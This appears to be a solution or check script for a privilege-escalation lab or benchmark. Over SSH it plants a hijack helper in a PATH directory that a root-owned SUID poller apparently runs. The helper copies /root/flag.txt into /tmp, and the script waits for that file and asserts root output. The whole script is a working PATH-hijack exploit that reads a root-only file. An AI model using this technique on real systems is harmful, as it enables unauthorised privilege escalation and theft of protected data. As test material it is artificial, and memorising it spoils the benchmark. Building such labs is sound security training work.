#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/suidpath_flag
mkdir -p /opt/pathhijack-suid
cat > /opt/pathhijack-suid/benchhelper <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/suidpath_flag
EOF
chmod +x /opt/pathhijack-suid/benchhelper
for i in $(seq 1 45); do
  if test -r /tmp/suidpath_flag && grep -q FLAG /tmp/suidpath_flag 2>/dev/null; then
    cat /tmp/suidpath_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for suid_path poller" >&2
ls -la /opt/bench/suid_path /opt/pathhijack-suid/benchhelper /tmp/suidpath_flag 2>&1 || true
exit 1
')"
assert_root_output "${out}"
